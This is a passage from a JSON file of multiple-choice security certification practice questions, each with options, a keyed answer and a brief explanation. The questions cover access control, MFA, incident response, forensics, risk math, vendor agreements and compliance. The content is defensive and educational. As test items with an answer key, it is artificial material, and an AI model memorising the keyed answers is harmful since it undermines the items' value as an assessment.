eakness of this model?","op":["Owners may grant access too broadly, with no central control","Access is decided by labels the system assigns automatically","Users can't change access once an administrator sets it","Access depends on attributes such as device health and location"],"a":[0],"n":1,"e":"In DAC, access depends on each owner's judgment."},{"o":"4.6","s":"A hospital puts all nurses in one group with the same chart access and doctors in another with different rights. When a nurse becomes a doctor, IT simply moves her account. Which model is this?","op":["Role-based access control","Mandatory access control","Rule-based access control","Discretionary access control"],"a":[0],"n":1,"e":"Rights tied to job function are RBAC."},{"o":"4.6","s":"Service account passwords for 200 servers sit in a spreadsheet and never change. Which solution BEST improves this?","op":["Requiring MFA to open the spreadsheet","Encrypting the spreadsheet with a passphrase","Moving it to a restricted file share","A privileged access vault that rotates them"],"a":[3],"n":1,"e":"Every alternative keeps static, shared passwords."},{"o":"4.6","s":"A policy forces 8-character complex passwords changed every 30 days, and users write them down. Which change BEST follows current guidance?","op":["12-character complex passwords changed every 60 days","A required change after every 10 logins","A history of 24 previous passwords","Longer passphrases with no forced periodic changes"],"a":[3],"n":1,"e":"Current guidance favors length and changes only on suspected compromise."},{"o":"4.6","s":"A user gets repeated MFA push prompts at night and finally approves one. Which control would BEST prevent this?","op":["Lockout after three denied pushes","Number matching in push prompts","A shorter push timeout","Blocking pushes outside business hours"],"a":[1],"n":1,"e":"Number matching forces the user to see the real login screen."},{"o":"4.6","s":"Automation jobs receive cloud credentials that expire after 15 minutes. What is this practice?","op":["Key rotation","Password vaulting","Just-in-time access","Ephemeral credentials"],"a":[3],"n":1,"e":"Short-lived credentials generated per job are ephemeral; JIT elevates a user's privileges."},{"o":"4.6","s":"A bank uses passwords plus SMS codes and wants to resist SIM-swap attacks. What is the BEST improvement?","op":["Require a longer password","Replace SMS with an authenticator app or security key","Add a security question after the SMS code is entered","Deliver codes by voice call instead"],"a":[1],"n":1,"e":"Voice calls are tied to the phone number too."},{"o":"4.6","s":"Users enter a password and then a PIN they chose at enrollment. Why is this NOT multifactor authentication?","op":["Both are something you know","A PIN is something you have","MFA requires a hardware token","A PIN counts as biometric"],"a":[0],"n":1,"e":"Two knowledge factors are still one factor type."},{"o":"4.6","s":"Which authentication method is MOST resistant to phishing?","op":["Push approval with number matching","A TOTP code from an authenticator app","A FIDO2 security key","A one-time code sent by SMS"],"a":[2],"n":1,"e":"TOTP and push can be relayed by a phishing proxy; FIDO2 is bound to the real site."},{"o":"4.6","s":"Domain admins have permanent rights. Security wants rights granted only for an approved ticket and removed automatically afterward. What should be implemented?","op":["Separate admin accounts for each admin","Password vaulting with check-out","Just-in-time privileged access","Time-of-day limits on admin accounts"],"a":[2],"n":1,"e":"Vaulting protects credentials but leaves standing privilege; JIT removes it."},{"o":"4.7","s":"Years-old undocumented scripts break with every OS update, and nobody understands them. Which consideration is this?","op":["Employee retention","Technical debt","Workforce multiplier","Single point of failure"],"a":[1],"n":1,"e":"Accumulated shortcuts that now cost effort are technical debt."},{"o":"4.7","s":"Automation lets three SOC analysts handle the alert volume that once needed ten. Which benefit is this?","op":["Baseline enforcement","Workforce multiplier","Employee retention","Standardized infrastructure"],"a":[1],"n":1,"e":"Doing more with the same staff is a workforce multiplier."},{"o":"4.7","s":"Code is built, scanned for security flaws, and tested automatically whenever developers commit changes. Which use case is this?","op":["Continuous integration and testing","Guard rails","Automated resource provisioning","Ticket creation"],"a":[0],"n":1,"e":"CI automates build and test on every commit."},{"o":"4.7","s":"When HR marks someone as hired, accounts, group memberships, and a laptop request are created automatically. Which use case is this?","op":["Ticket creation","Guard rails","User provisioning","Resource provisioning"],"a":[2],"n":1,"e":"Creating accounts and access for people is user provisioning."},{"o":"4.7","s":"A pipeline automatically blocks any cloud deployment that would create an unencrypted database. What is this called?","op":["Continuous integration","Guard rails","Escalation","Security groups"],"a":[1],"n":1,"e":"Guard rails stop unsafe changes automatically."},{"o":"4.7","s":"A phishing alert automatically opens an incident ticket assigned to the on-call analyst. Which use case is this?","op":["Escalation","Ticket creation","User provisioning","Enabling/disabling services"],"a":[1],"n":1,"e":"Opening the ticket is ticket creation."},{"o":"4.7","s":"If an incident ticket isn't acknowledged within 15 minutes, automation pages the SOC manager. Which use case is this?","op":["Escalation","Ticket creation","Guard rails","Continuous integration"],"a":[0],"n":1,"e":"Raising an unhandled issue to a higher level is escalation."},{"o":"4.7","s":"All provisioning runs through one automation server; when it failed, onboarding stopped for two days. Which consideration was overlooked?","op":["Single point of failure","Complexity","Cost of the automation licenses","Technical debt"],"a":[0],"n":1,"e":"One component took everything down."},{"o":"4.8","s":"After service is restored, the team finds an unpatched VPN appliance allowed entry and a missing alert delayed detection. What produced these findings?","op":["Threat hunting","Forensic acquisition","Root cause analysis","A tabletop exercise"],"a":[2],"n":1,"e":"Identifying the underlying causes is root cause analysis."},{"o":"4.8","s":"Which order is correct for the middle phases of incident response?","op":["Analysis, recovery, containment","Containment, recovery, eradication","Eradication, containment, recovery","Containment, eradication, recovery"],"a":[3],"n":1,"e":"Stop the spread, remove the threat, then restore."},{"o":"4.8","s":"Ransomware is confirmed on three workstations still on the network, and management wants restores to start immediately. What should happen FIRST?","op":["Reset all domain passwords","Isolate the infected workstations","Reimage the three workstations","Restore the affected files from backup"],"a":[1],"n":1,"e":"Contain first; restored files can be encrypted again while the malware is active."},{"o":"4.8","s":"A compromised web server is isolated. Analysts now remove a web shell and a backdoor account before rebuilding. Which phase is this?","op":["Eradication","Analysis","Recovery","Containment"],"a":[0],"n":1,"e":"Removing the attacker's footholds is eradication."},{"o":"4.8","s":"An alert fires for unusual outbound traffic. The team works out which hosts are involved and whether it's malicious before acting. Which phase is this?","op":["Preparation","Detection","Containment","Analysis"],"a":[3],"n":1,"e":"Detection is noticing; scoping and confirming is analysis."},{"o":"4.8","s":"Six weeks after an incident, the same entry point is used again because the review's recommendations were never assigned. Which phase failed?","op":["Recovery","Detection","Eradication","Lessons learned"],"a":[3],"n":1,"e":"Turning findings into assigned improvements is part of lessons learned."},{"o":"4.8","s":"Leaders talk through a ransomware scenario around a table without touching any systems. What is this?","op":["Failover test","Tabletop exercise","Parallel processing test","Simulation"],"a":[1],"n":1,"e":"Discussion-only exercises are tabletops."},{"o":"4.8","s":"With no alert, an analyst uses new threat intelligence to search logs for a specific group's tools. What is this?","op":["Root cause analysis","Threat hunting","Threat intelligence gathering","Detection"],"a":[1],"n":1,"e":"Proactively searching for an attacker is threat hunting."},{"o":"4.8","s":"Which collection order follows the order of volatility?","op":["Cache and RAM, then disk, then remote logs, then backups","Disk first, then RAM, then the backups, then the CPU cache","Remote logs, then RAM, then disk, then cache","Backups, then disk, then RAM, then cache"],"a":[0],"n":1,"e":"The most volatile data goes first."},{"o":"4.8","s":"Responders reach a running server suspected of memory-only malware. What should they capture FIRST?","op":["Screenshots of the process list","The server's event logs","A memory image","A full disk image"],"a":[2],"n":1,"e":"Volatile memory comes first; memory-only malware vanishes at shutdown."},{"o":"4.8","s":"Litigation is expected over a breach, and email auto-deletes after 90 days. What must legal instruct IT to do?","op":["Extend retention to one year company-wide","Export every mailbox to tape","Place a legal hold on relevant data","Begin e-discovery on all mailboxes"],"a":[2],"n":1,"e":"A legal hold preserves relevant data; e-discovery comes later."},{"o":"4.8","s":"How does an investigator show in court that a drive image matches the original?","op":["Matching cryptographic hashes of both","A signed chain of custody form","Write-blocker logs from acquisition","Matching file counts and sizes"],"a":[0],"n":1,"e":"Chain of custody proves handling; matching hashes prove the copy is identical."},{"o":"4.8","s":"A seized laptop sat overnight in an unlocked office with no record of access. What is the MAIN legal concern?","op":["A gap in the chain of custody","An invalid legal hold","Missing e-discovery tags","Loss of volatile evidence"],"a":[0],"n":1,"e":"Unrecorded access breaks custody."},{"o":"4.8","s":"Which device prevents a forensic workstation from modifying a suspect drive during imaging?","op":["A write blocker","A hardware security module","A Faraday bag","A powered USB hub"],"a":[0],"n":1,"e":"Write blockers stop any writes to the evidence."},{"o":"4.8","s":"Opposing counsel requests all electronically stored information about a contract dispute. Which process collects and produces it?","op":["Legal hold","E-discovery","Chain of custody","Data retention"],"a":[1],"n":1,"e":"E-discovery finds and produces the information."},{"o":"4.8","s":"A seized phone must not receive a remote wipe command before analysis. What should be used?","op":["A Faraday bag","Powering the phone off","Airplane mode only","A write blocker"],"a":[0],"n":1,"e":"Airplane mode can be undone and powering off loses volatile data; a Faraday bag blocks signals."},{"o":"4.9","s":"An analyst must prove what file was sent to an external server two hours ago. Which source shows the file's contents in transit?","op":["NetFlow records","Full packet capture","Firewall logs","Proxy logs"],"a":[1],"n":1,"e":"Proxy logs show the URL and size; only packet capture has the payload."},{"o":"4.9","s":"Packet captures are kept 24 hours, but the analyst needs 30 days of which hosts talked to a suspicious IP and how much data moved. Which source fits?","op":["Endpoint logs","DNS query logs","NetFlow records","IPS alerts"],"a":[2],"n":1,"e":"DNS logs show lookups, not volumes; flow records are compact and kept longer."},{"o":"4.9","s":"A user denies opening a malicious attachment. Which source BEST shows whether its process ran?","op":["Firewall logs","Endpoint logs","Proxy logs","Email gateway logs"],"a":[1],"n":1,"e":"The gateway shows delivery; endpoint logs show execution."},{"o":"4.9","s":"Investigators want to know which account created a leaked document and when. What should they examine?","op":["DLP incident logs","Email gateway logs","The document's metadata","File server access logs"],"a":[2],"n":1,"e":"Access logs show who opened it; metadata records the author and creation time."},{"o":"4.9","s":"Windows servers show many failed logons across many accounts from one IP. Which source shows this MOST directly?","op":["Windows Security log (Event ID 4625)","Application logs","Windows System log (Event ID 6008)","NetFlow records"],"a":[0],"n":1,"e":"Logon failures go to the Security log, not the System log."},{"o":"4.9","s":"An admin page was used to change product prices. Which source BEST shows which user account changed what?","op":["Firewall logs","Web server access logs","Database transaction logs","Application logs"],"a":[3],"n":1,"e":"The database sees the app's service account; the application log records the actual user."},{"o":"4.9","s":"The CISO needs an at-a-glance view of incidents, alert trends, and patch compliance for the board. What should the analyst provide?","op":["A dashboard or automated report","NetFlow summaries","A vulnerability scan report","A raw SIEM search export"],"a":[0],"n":1,"e":"Executives need summarized visuals."},{"o":"4.9","s":"An IPS blocked an exploit. The analyst needs to know whether earlier attempts from the same source got through before the signature existed. Which sources help MOST?","op":["Firewall and web server access logs","The IPS's current alert log","Endpoint antivirus logs","Vulnerability scan history for the server"],"a":[0],"n":1,"e":"The IPS only logs what it matched; firewall and server logs show what got through."},{"o":"5.1","s":"A document states: \"The company will protect customer information in accordance with applicable laws.\" What type of document is this?","op":["Guideline","Standard","Policy","Procedure"],"a":[2],"n":1,"e":"A broad statement of intent is a policy."},{"o":"5.1","s":"Help desk staff follow a numbered checklist to reset a user's MFA device, including how to verify the user's identity. What type of document is this?","op":["Procedure","Policy","Standard","Guideline"],"a":[0],"n":1,"e":"Step-by-step instructions are a procedure."},{"o":"5.1","s":"Security publishes \"suggested settings\" for home routers that employees are encouraged, but not required, to apply. What type of document is this?","op":["Policy","Procedure","Guideline","Standard"],"a":[2],"n":1,"e":"Optional recommendations are guidelines."},{"o":"5.1","s":"The SOC has a document listing exactly which tools to open, what data to collect, and whom to call when a ransomware alert fires. What is it BEST called?","op":["A risk register","A playbook","An acceptable use policy","A business continuity policy"],"a":[1],"n":1,"e":"Scenario-specific response steps form a playbook."},{"o":"5.1","s":"Which document would MOST likely contain the rule \"Employees may not install personal software on company laptops\"?","op":["Incident response playbook","Change management procedure","Disaster recovery plan","Acceptable use policy"],"a":[3],"n":1,"e":"The AUP defines acceptable use of company equipment."},{"o":"5.1","s":"A new requirement says \"Passwords must be at least 14 characters,\" and IT configures Group Policy to enforce it. Which statement is correct?","op":["The requirement is a procedure; Group Policy is its documentation","The requirement is a guideline; Group Policy makes it a mandatory standard","The requirement is a standard; Group Policy is the control enforcing it","Both the written requirement and the Group Policy setting are policies"],"a":[2],"n":1,"e":"The written requirement is a standard; the system setting enforces it."},{"o":"5.1","s":"Which document describes how new employees receive accounts, equipment, and training on their first day?","op":["Business continuity policy","Acceptable use policy","Password standard","Onboarding procedure"],"a":[3],"n":1,"e":"Onboarding is a procedure."},{"o":"5.1","s":"A document says: \"All laptops must use full-disk encryption with AES-256.\" What type of document is this?","op":["A procedure, because it involves configuring each device","A guideline, because encryption is a recommended practice","A standard, because it sets a specific mandatory requirement","A policy, because it applies to all company-owned laptops"],"a":[2],"n":1,"e":"A specific required control such as AES-256 makes it a standard."},{"o":"5.1","s":"Department heads meet monthly to review security risks and recommend policy changes to executives. Which governance structure is this?","op":["Board","Committee","Government entity","Audit firm"],"a":[1],"n":1,"e":"Committees provide focused oversight."},{"o":"5.1","s":"A national agency sets mandatory cybersecurity rules for power utilities. Which governance structure is this?","op":["Committee","Industry guideline","Government entity","Board"],"a":[2],"n":1,"e":"Government entities issue binding requirements."},{"o":"5.1","s":"Each business unit sets its own security policies with little central oversight. Which governance structure is this?","op":["Decentralized","Federated","Centralized","Board-led"],"a":[0],"n":1,"e":"Authority is spread across units."},{"o":"5.1","s":"Why should security policies be reviewed on a regular schedule?","op":["Policies legally expire after a year","Threats, technology, and regulations change","Reviews replace training","Auditors require new formatting"],"a":[1],"n":1,"e":"Monitoring and revision keep policies current."},{"o":"5.1","s":"Card brands require merchants to follow PCI DSS. Which external consideration is this?","op":["Industry","Local/regional","National","Internal"],"a":[0],"n":1,"e":"PCI DSS is an industry standard."},{"o":"5.1","s":"A state requires businesses to notify residents of data breaches within a set time. Which external consideration is this?","op":["Internal policy","Industry standard","Local/regional","Global/international"],"a":[2],"n":1,"e":"State or city laws are local/regional."},{"o":"5.1","s":"A company must comply with GDPR because it processes EU residents' data. Which type of external consideration is this?","op":["Contractual","Guideline","Internal","Regulatory"],"a":[3],"n":1,"e":"GDPR is a legal regulation."},{"o":"5.1","s":"Security direction for a company is set by directors elected by shareholders. Which governance structure is this?","op":["Board","Committee","Government entity","Decentralized team"],"a":[0],"n":1,"e":"The board of directors oversees governance."},{"o":"5.1","s":"A system administrator sets encryption and access permissions on the HR file server exactly as HR leadership specified. What is the administrator's role?","op":["Data custodian","Data steward","Data owner","Data subject"],"a":[0],"n":1,"e":"Custodians implement what owners decide."},{"o":"5.1","s":"A customer asks a retailer for a copy of all personal data it holds about her. In privacy terms, what is the customer?","op":["The data subject","The data processor","The data custodian","The data controller"],"a":[0],"n":1,"e":"The person the data describes is the subject."},{"o":"5.1","s":"Who should decide whether a financial dataset may be shared with an outside auditor?","op":["The database administrator","The backup operator","The data owner","The data custodian"],"a":[2],"n":1,"e":"Owners approve access."},{"o":"5.1","s":"A cloud email vendor begins using a client's customer list to run its own advertising campaigns without permission. Why is this a problem?","op":["The vendor has legally become the data subject of the list","Processors may use client data for any purpose they choose","The client becomes the processor once the vendor holds the data","A processor may only process data as the controller instructs"],"a":[3],"n":1,"e":"Using data for its own purposes breaks the processor's limits."},{"o":"5.1","s":"Which are responsibilities of a data custodian? (Choose two.)","op":["Approving new access requests","Implementing the access controls the owner approved","Performing backups of the data","Deciding why the data is collected","Deciding the data's classification"],"a":[1,2],"n":2,"e":"Custodians do technical work; owners and controllers make the decisions."},{"o":"5.1","s":"The VP of Marketing decides the customer mailing list is Confidential and approves which teams may use it. The database team backs it up nightly. Who is the data owner?","op":["The customers on the list","The database team","The email platform vendor","The VP of Marketing"],"a":[3],"n":1,"e":"The owner decides classification and access."},{"o":"5.1","s":"A marketing analyst fixes duplicate records in the customer list and makes sure every field is labeled correctly. What is the analyst's role?","op":["Data controller","Data custodian","Data processor","Data steward"],"a":[3],"n":1,"e":"Stewards maintain quality and labeling."},{"o":"5.1","s":"A clinic decides to collect patients' phone numbers for reminders and hires a texting service that sends them exactly as instructed. Which statement is correct?","op":["The texting service is the controller because it sends the texts","The patients are the data processors","Both organizations are data custodians","The clinic is the controller; the texting service is the processor"],"a":[3],"n":1,"e":"Whoever decides why and how is the controller; whoever acts on instructions is the processor."},{"o":"5.2","s":"A risk assessment rates threats as high, medium, or low based on expert judgment. Which approach is this?","op":["Quantitative","Qualitative","Statistical","Annualized"],"a":[1],"n":1,"e":"Qualitative assessments use categories rather than numbers."},{"o":"5.2","s":"A risk assessment calculates potential losses in dollars using asset values and expected frequency. Which approach is this?","op":["Qualitative","Heuristic","Ad hoc","Quantitative"],"a":[3],"n":1,"e":"Quantitative assessments use numeric values."},{"o":"5.2","s":"In a risk matrix, risk is usually determined by combining which two factors?","op":["Cost and vendor","Asset age and location","Likelihood and impact","Users and devices"],"a":[2],"n":1,"e":"Risk reflects how likely something is and how bad it would be."},{"o":"5.2","s":"What is the FIRST step of the risk management process?","op":["Risk reporting","Risk transference","Risk identification","Risk mitigation"],"a":[2],"n":1,"e":"Risks must be identified before they can be assessed."},{"o":"5.2","s":"A risk assessment is performed once before a single project launches and is not repeated. Which type is this?","op":["Continuous","Ad hoc","Recurring","One-time"],"a":[3],"n":1,"e":"One-time assessments serve a specific event."},{"o":"5.2","s":"An organization performs a risk assessment every January. Which type is this?","op":["Continuous","One-time","Recurring","Ad hoc"],"a":[2],"n":1,"e":"Scheduled repeats are recurring."},{"o":"5.2","s":"After news of a new attack technique, the team immediately assesses its exposure. Which type of assessment is this?","op":["Scheduled","Recurring","Continuous","Ad hoc"],"a":[3],"n":1,"e":"Ad hoc assessments respond to an unplanned need."},{"o":"5.2","s":"Automated tools evaluate risk constantly as systems and threats change. Which type is this?","op":["Recurring","Continuous","Ad hoc","One-time"],"a":[1],"n":1,"e":"Continuous assessment never stops."},{"o":"5.2","s":"Which formula calculates annualized loss expectancy?","op":["EF × ARO","SLE ÷ ARO","SLE × ARO","Asset value × ARO"],"a":[2],"n":1,"e":"ALE = SLE × ARO."},{"o":"5.2","s":"A control costs $15,000 a year and lowers the ALE from $40,000 to $10,000. Is it cost-effective?","op":["No, controls over $10,000 are too expensive","Yes, because the ALE is now zero","Yes, it saves $30,000 a year, more than it costs","No, it costs more than the remaining ALE"],"a":[2],"n":1,"e":"The $30,000 reduction exceeds the $15,000 cost."},{"o":"5.2","s":"A ransomware incident would cost $500,000 and is expected once every 4 years. What is the ALE?","op":["$500,000","$125,000","$2,000,000","$250,000"],"a":[1],"n":1,"e":"ARO = 0.25, so ALE = $500,000 × 0.25."},{"o":"5.2","s":"A server is worth $20,000, and a flood would destroy 50% of its value. What is the single loss expectancy?","op":["$10,000","$5,000","$20,000","$40,000"],"a":[0],"n":1,"e":"SLE = asset value × exposure factor = $20,000 × 0.5."},{"o":"5.2","s":"The SLE for a laptop theft is $2,000, and five thefts are expected each year. What is the ALE?","op":["$400","$7,000","$2,000","$10,000"],"a":[3],"n":1,"e":"ALE = SLE × ARO = $2,000 × 5."},{"o":"5.2","s":"A data center floods once every 20 years on average. What is the annualized rate of occurrence?","op":["0.05","20","0.5","2"],"a":[0],"n":1,"e":"ARO = 1 ÷ 20 = 0.05."},{"o":"5.2","s":"What does the exposure factor represent?","op":["Annual cost of the chosen control","Expected total loss over a full year","Percent of asset value lost in one incident","Expected number of incidents per year"],"a":[2],"n":1,"e":"EF is the percentage lost per event; incidents per year is ARO and yearly loss is ALE."},{"o":"5.2","s":"An asset worth $100,000 has an exposure factor of 25% and an ARO of 2. What is the ALE?","op":["$200,000","$50,000","$12,500","$25,000"],"a":[1],"n":1,"e":"SLE = $25,000, so ALE = $25,000 × 2."},{"o":"5.2","s":"What is a risk threshold in a risk register used for?","op":["The level at which a risk requires action","The minimum password length allowed","The person who owns the data at risk","The formula for calculating control costs"],"a":[0],"n":1,"e":"Thresholds trigger responses."},{"o":"5.2","s":"An organization balances risk and reward without strongly favoring either. Which appetite is this?","op":["Conservative","Expansionary","Avoidant","Neutral"],"a":[3],"n":1,"e":"A neutral appetite is balanced."},{"o":"5.2","s":"Which document lists identified risks with their owners, ratings, and planned responses?","op":["Risk register","Business impact analysis","Acceptable use policy","Rules of engagement"],"a":[0],"n":1,"e":"A risk register tracks risks."},{"o":"5.2","s":"A metric that warns management when a risk is growing, such as the count of unpatched critical servers, is called a:","op":["Recovery point objective","Risk owner","Exposure factor","Key risk indicator"],"a":[3],"n":1,"e":"KRIs are early-warning metrics."},{"o":"5.2","s":"The person accountable for managing a specific risk in the register is the:","op":["Risk owner","Data processor","Data subject","Penetration tester"],"a":[0],"n":1,"e":"Each risk is assigned an owner."},{"o":"5.2","s":"A startup will accept significant risk to grow quickly and capture market share. Which risk appetite is this?","op":["Avoidant","Expansionary","Neutral","Conservative"],"a":[1],"n":1,"e":"An expansionary appetite accepts more risk for growth."},{"o":"5.2","s":"A bank prefers to minimize risk even if it slows innovation. Which risk appetite is this?","op":["Neutral","Expansionary","Conservative","Aggressive"],"a":[2],"n":1,"e":"A conservative appetite avoids risk."},{"o":"5.2","s":"What is the difference between risk appetite and risk tolerance?","op":["Appetite is set by regulators; tolerance by the board of directors","Appetite applies only to IT; tolerance applies to the whole business","Tolerance is the overall level sought; appetite is the allowed deviation","Appetite is the overall level sought; tolerance is the allowed deviation"],"a":[3],"n":1,"e":"Appetite is broad; tolerance sets specific limits around it."},{"o":"5.2","s":"After deploying MFA and EDR, the remaining breach risk is still above the company's risk appetite. What should happen next?","op":["Accept the risk anyway without documenting the decision or the owner","Stop measuring this risk so it no longer appears in board reports","Add controls or another strategy until residual risk is within appetite","Remove the new controls, since they failed to eliminate all of the risk"],"a":[2],"n":1,"e":"Residual risk must be brought within appetite or formally addressed."},{"o":"5.2","s":"A company outsources payment processing to a PCI-compliant provider that contractually accepts liability for card data breaches. Which risk strategy is this?","op":["Accept","Mitigate","Avoid","Transfer"],"a":[3],"n":1,"e":"A contract shifts the liability to a third party."},{"o":"5.2","s":"Management decides not to launch a mobile app in a country whose regulations it can't meet. Which strategy is this?","op":["Avoid","Accept","Transfer","Mitigate"],"a":[0],"n":1,"e":"Not doing the activity avoids the risk."},{"o":"5.2","s":"A risk has $2,000 per year in expected losses, and the cheapest control costs $25,000 per year. Management documents a decision to take no action. Which strategy is this?","op":["Transfer","Accept","Mitigate","Avoid"],"a":[1],"n":1,"e":"When the control costs more than the risk, documented acceptance is reasonable."},{"o":"5.2","s":"A company deploys EDR, enables MFA, and trains staff to lower the likelihood of ransomware. Which strategy is this?","op":["Accept","Mitigate","Transfer","Avoid"],"a":[1],"n":1,"e":"Controls that reduce likelihood or impact mitigate."},{"o":"5.2","s":"A server can't meet the encryption standard until a hardware upgrade in 90 days. The CISO approves the deviation with added monitoring and an end date. What is this?","op":["Risk transference","Risk avoidance","An exemption","An exception"],"a":[3],"n":1,"e":"A temporary, approved deviation is an exception."},{"o":"5.2","s":"A lobby display screen stores no data and has no network connection. The CISO rules that the endpoint-encryption standard simply doesn't apply to it. What is this?","op":["Risk mitigation","An exemption","An exception","Risk transference"],"a":[1],"n":1,"e":"A standing release from a requirement that doesn't apply is an exemption."},{"o":"5.2","s":"Even after buying cyber insurance, which risk remains with the company?","op":["All financial losses from any future breach","Reputational damage and lost customer trust","Only the insurer's share of the financial risk","No risk at all, since insurance covers everything"],"a":[1],"n":1,"e":"Insurance offsets costs but can't restore reputation."},{"o":"5.2","s":"An online store loses about $50,000 an hour while checkout is down, and leadership says checkout must be back within 30 minutes. Which metric did leadership just set?","op":["Mean time to repair","Recovery point objective","Mean time between failures","Recovery time objective"],"a":[3],"n":1,"e":"How fast service must return is the RTO."},{"o":"5.2","s":"The same store says losing even 5 minutes of orders is unacceptable. Which metric does this define, and what does it require?","op":["MTBF; failures no more often than every 5 minutes","RTO; restoring service within 5 minutes","MTTR; repairs completed within 5 minutes","RPO; backups or replication at least every 5 minutes"],"a":[3],"n":1,"e":"How much data may be lost is the RPO, which sets backup frequency."},{"o":"5.2","s":"A company backs up its database every 24 hours, but its RPO is 1 hour. What does this mean?","op":["The current backups satisfy the RPO","The MTBF of the database is too short","The RTO is too long for the business","Backup frequency does not meet the RPO"],"a":[3],"n":1,"e":"Daily backups could lose up to 24 hours of data."},{"o":"5.2","s":"Array A averages 200,000 hours between failures; Array B averages 80,000. Which metric is being compared, and which array is more reliable?","op":["RPO; Array B","MTTR; Array B","MTBF; Array A","RTO; Array A"],"a":[2],"n":1,"e":"A higher MTBF means more reliable."},{"o":"5.2","s":"Technicians take six hours on average to restore a failed router because spare parts ship from another city. Which change would MOST improve MTTR?","op":["Taking backups more often","Keeping spare parts on site","Buying routers with higher MTBF","Lowering the RPO"],"a":[1],"n":1,"e":"On-site spares shorten repair time."},{"o":"5.2","s":"A business impact analysis finds payroll can be down for three days, but customer ordering for only one hour. How should this guide recovery?","op":["Recover whichever system failed first","Recover payroll first because it affects employees","Recover both at once with equal resources","Recover customer ordering before payroll"],"a":[3],"n":1,"e":"The BIA sets recovery priority by impact."},{"o":"5.2","s":"A system's RTO is 4 hours, but tests show restoration takes 9 hours. What should the organization do?","op":["Ignore the test results, since real disasters are very rare","Raise the MTBF target so the system fails less often overall","Lower the RPO so less data has to be restored after a failure","Improve recovery or the architecture, or formally revisit the RTO"],"a":[3],"n":1,"e":"A gap between target and capability must be closed or formally re-decided."},{"o":"5.2","s":"Which question does a recovery point objective answer?","op":["How much data can we afford to lose?","How long can we be down?","How long does a repair take?","How often does the system fail?"],"a":[0],"n":1,"e":"RPO is about data loss; RTO is about downtime."},{"o":"5.3","s":"Before choosing a cloud provider, a company researches its finances, certifications, and breach history. What is this?","op":["Vendor monitoring","Supply chain attack","Rules of engagement","Due diligence"],"a":[3],"n":1,"e":"Due diligence is investigation before engagement."},{"o":"5.3","s":"A purchasing manager owns shares in a vendor bidding on a large contract. What concern does this raise?","op":["Supply chain analysis","Due diligence","Conflict of interest","Right to audit"],"a":[2],"n":1,"e":"Personal interest could bias the selection."},{"o":"5.3","s":"A company sends a vendor a detailed list of questions about its encryption, access controls, and incident response. What is this?","op":["Rules of engagement","Questionnaire","Right-to-audit clause","Penetration test"],"a":[1],"n":1,"e":"Security questionnaires assess vendors."},{"o":"5.3","s":"Before a third-party penetration test, both sides agree on scope, timing, and which systems are off-limits. What is this document?","op":["Rules of engagement","Master service agreement","Business partners agreement","Non-disclosure agreement"],"a":[0],"n":1,"e":"Rules of engagement define test boundaries."},{"o":"5.3","s":"After onboarding, a company periodically reviews a vendor's security reports and breach news. What is this?","op":["Conflict of interest","Vendor selection","Vendor monitoring","Due diligence"],"a":[2],"n":1,"e":"Ongoing oversight is vendor monitoring."},{"o":"5.3","s":"A vendor provides a SOC 2 report written by an independent auditor. What does this represent?","op":["Self-assessment","Rules of engagement","Bug bounty","Independent assessment"],"a":[3],"n":1,"e":"A third party evaluated the vendor's controls."},{"o":"5.3","s":"A company examines where a vendor's hardware components come from and who makes them. What is this?","op":["Financial due diligence","Supply chain analysis","Vendor monitoring","Penetration testing"],"a":[1],"n":1,"e":"It assesses the vendor's own suppliers."},{"o":"5.3","s":"A contract clause lets a company inspect a vendor's security controls. What is it?","op":["Non-disclosure clause","Service-level agreement","Right-to-audit clause","Rules of engagement"],"a":[2],"n":1,"e":"It grants the right to audit."},{"o":"5.3","s":"Two city agencies want to share incident information. They document shared goals and intentions, but neither wants legally binding obligations. What should they sign?","op":["Statement of work","Memorandum of understanding","Master service agreement","Service-level agreement"],"a":[1],"n":1,"e":"An MOU records intent without binding terms."},{"o":"5.3","s":"Two companies forming a joint venture must define how profits, losses, and management decisions are shared. Which agreement fits BEST?","op":["Business partners agreement","Non-disclosure agreement","Memorandum of understanding","Service-level agreement"],"a":[0],"n":1,"e":"A BPA governs a business partnership."},{"o":"5.3","s":"Before a penetration testing firm reviews a company's network diagrams, the company wants legal protection if the firm leaks them. What should be signed?","op":["Memorandum of agreement","Business partners agreement","Non-disclosure agreement","Service-level agreement"],"a":[2],"n":1,"e":"An NDA protects confidential information."},{"o":"5.3","s":"Two agencies formalize a partnership with specific, documented responsibilities for each side, more formal than a statement of intent. Which document fits BEST?","op":["Statement of work","Memorandum of agreement","Non-disclosure agreement","Memorandum of understanding"],"a":[1],"n":1,"e":"An MOA is more formal and specific than an MOU."},{"o":"5.3","s":"A vendor keeps missing its promised response times. Which document should the company review to determine its remedies?","op":["The MOU","The NDA","The BPA","The SLA"],"a":[3],"n":1,"e":"The SLA defines targets and remedies."},{"o":"5.3","s":"Under an existing master contract, a vendor must complete one specific security assessment within six weeks for a fixed fee. Which document defines this work?","op":["Memorandum of understanding","Non-disclosure agreement","Statement of work","Service-level agreement"],"a":[2],"n":1,"e":"A SOW (work order) defines one project's scope, timing, and price."},{"o":"5.3","s":"A cloud provider promises 99.95% uptime and a 15-minute response to critical tickets, with credits if it misses either. Which agreement contains these terms?","op":["Service-level agreement","Business partners agreement","Non-disclosure agreement","Memorandum of understanding"],"a":[0],"n":1,"e":"Measurable service targets and remedies belong in the SLA."},{"o":"5.3","s":"A company signs one contract with a consulting firm covering payment terms, liability, and confidentiality for all future projects. Each new project then gets a short document with its deliverables and price. What are the two documents?","op":["An SLA, then a BPA for each project","A SOW, then an MSA for each project","An MOU, then an NDA for each project","An MSA, then a SOW for each project"],"a":[3],"n":1,"e":"The MSA is the umbrella contract; each project gets a SOW."},{"o":"5.4","s":"Employees sign a form each year confirming they have read and understood the security policies. What is this?","op":["E-discovery request","Legal hold notice","Due diligence review","Policy attestation"],"a":[3],"n":1,"e":"Signing to confirm you've read and understood policies is attestation and acknowledgement."},{"o":"5.4","s":"A company submits required breach statistics to a government regulator. What type of compliance reporting is this?","op":["Ad hoc","Self-assessment","External","Internal"],"a":[2],"n":1,"e":"Reporting to an outside authority is external."},{"o":"5.4","s":"A company continually reviews and maintains its protections, showing it acted responsibly over time. Which concept is this?","op":["Risk transference","Data sovereignty","Due care","Right to be forgotten"],"a":[2],"n":1,"e":"Due care is ongoing responsible action."},{"o":"5.4","s":"Why should an organization maintain a data inventory?","op":["Knowing what personal data it holds and where","Reducing how often backups are needed","Justifying the collection of more data","Avoiding the need to encrypt stored data"],"a":[0],"n":1,"e":"Inventory supports retention and privacy compliance."},{"o":"5.4","s":"A bank loses permission to operate in a state after repeated regulatory violations. Which 